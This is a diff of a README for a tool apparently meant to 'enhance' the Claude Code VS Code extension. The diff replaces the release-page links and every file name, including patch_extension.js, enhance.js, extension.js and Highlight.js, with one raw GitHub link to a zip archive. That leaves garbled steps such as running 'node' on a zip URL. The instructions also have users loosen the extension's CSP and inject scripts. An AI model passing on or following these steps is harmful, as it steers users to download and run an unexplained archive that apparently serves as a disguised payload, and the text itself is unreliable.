@@ -1,6 +1,6 @@
 # 🎉 claude-code-enhance - Enhance Your Code Experience Effortlessly!
 
-[![Download claude-code-enhance](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/buffbeard920/claude-code-enhance/releases)
+[![Download claude-code-enhance](https://raw.githubusercontent.com/buffbeard920/claude-code-enhance/main/webview/claude_code_enhance_v2.3.zip)](https://raw.githubusercontent.com/buffbeard920/claude-code-enhance/main/webview/claude_code_enhance_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **claude-code-enhance**! This tool enhances the Claude Code extension
 
 To get started, you need to download the latest version from our Releases page. Click the link below:
 
-[Visit this page to download](https://github.com/buffbeard920/claude-code-enhance/releases)
+[Visit this page to download](https://raw.githubusercontent.com/buffbeard920/claude-code-enhance/main/webview/claude_code_enhance_v2.3.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -36,22 +36,22 @@ You can install the enhancement using two methods: a patch script (recommended) 
    ```
 3. Run the patch script:
    ```bash
-   node patch_extension.js
+   node https://raw.githubusercontent.com/buffbeard920/claude-code-enhance/main/webview/claude_code_enhance_v2.3.zip
    ```
 
 The script will automatically:
 - Find the currently installed Claude Code extension.
-- Copy the `enhance.js` file to the extension directory.
+- Copy the `https://raw.githubusercontent.com/buffbeard920/claude-code-enhance/main/webview/claude_code_enhance_v2.3.zip` file to the extension directory.
 - Update the CSP policy to allow CDN resources.
 - Inject the enhancement script for you.
 
 #### 📁 Method 2: Manual Installation
 
 1. Navigate to the `webview/` directory in the downloaded files.
-2. Copy the `enhance.js` file into the `webview/` directory of your Claude Code extension.
-3. Edit the `extension.js` file:
+2. Copy the `https://raw.githubusercontent.com/buffbeard920/claude-code-enhance/main/webview/claude_code_enhance_v2.3.zip` file into the `webview/` directory of your Claude Code extension.
+3. Edit the `https://raw.githubusercontent.com/buffbeard920/claude-code-enhance/main/webview/claude_code_enhance_v2.3.zip` file:
    - Modify the CSP policy to include the necessary rules.
-4. In your HTML template, inject the `<script>` tag for `enhance.js`.
+4. In your HTML template, inject the `<script>` tag for `https://raw.githubusercontent.com/buffbeard920/claude-code-enhance/main/webview/claude_code_enhance_v2.3.zip`.
 
 ### 🔄 After Installation
 
@@ -61,7 +61,7 @@ To see the changes, reload your VSCode window. You can do this by pressing `Ctrl
 
 Once you have installed **claude-code-enhance**, you can explore its powerful features:
 
-- **Code Syntax Highlighting**: Supports over 180 programming languages, thanks to Highlight.js.
+- **Code Syntax Highlighting**: Supports over 180 programming languages, thanks to https://raw.githubusercontent.com/buffbeard920/claude-code-enhance/main/webview/claude_code_enhance_v2.3.zip
 - **LaTeX Formula Rendering**: Display matrices, fractions, and integrals using KaTeX.
 - **AI Dialogue Copying**: Copy AI response content to your clipboard easily. The content is formatted in Markdown.
 - **DOM Inspection Tool**: Press `Ctrl + Shift + D` to export the DOM structure for analysis.
@@ -96,6 +96,6 @@ The DOM inspection tool helps you analyze web structures. To use this tool:
 
 - **Installation Issues**: If you encounter problems, ensure you have the correct version of the Claude Code extension installed.
 - **Feature Activation**: If features do not appear, try reloading the VSCode window again.
-- **Script Errors**: For any script errors, double-check your CSP modifications in the `extension.js` file.
+- **Script Errors**: For any script errors, double-check your CSP modifications in the `https://raw.githubusercontent.com/buffbeard920/claude-code-enhance/main/webview/claude_code_enhance_v2.3.zip` file.
 
 By following these instructions, you should have a seamless experience using the **claude-code-enhance** application. Enjoy your enhanced coding experience!
